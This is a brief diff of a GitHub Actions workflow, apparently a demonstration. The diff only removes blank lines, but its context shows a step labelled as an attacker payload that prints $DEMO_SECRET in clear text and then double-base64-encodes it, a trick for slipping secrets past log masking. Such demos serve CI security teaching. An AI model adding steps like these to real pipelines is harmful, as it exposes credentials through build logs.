@@ -8,7 +8,6 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-
       - name: Étape normale
         run: |
           echo "----- Début du log légitime -----"
@@ -24,7 +23,6 @@ jobs:
           echo "===== ATTACKER PAYLOAD ACTIVÉ ====="
           echo "[Attacker] Secret en clair : $DEMO_SECRET"
           echo ""
-
           encoded=$(echo -n "$DEMO_SECRET" | base64 | base64)
           echo "[Attacker] Encodé 2x : $encoded"
 
